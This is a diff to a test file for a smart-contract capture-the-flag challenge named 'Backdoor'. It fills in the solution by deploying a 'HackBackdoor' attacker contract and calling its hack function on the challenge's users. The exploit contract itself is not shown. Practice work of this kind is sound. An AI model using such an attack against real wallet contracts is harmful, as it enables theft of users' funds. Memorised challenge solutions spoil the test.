@@ -46,6 +46,17 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy our hacker contract
+        hackBackdoor = await (await ethers.getContractFactory('HackBackdoor', deployer)).deploy(
+            masterCopy.address,
+            walletFactory.address,
+            walletRegistry.address,
+            token.address
+        );
+
+        // Hack the backdoor in one transaction passing users as argument
+        await hackBackdoor.connect(player).hack(users);
+    
     });
 
     after(async function () {
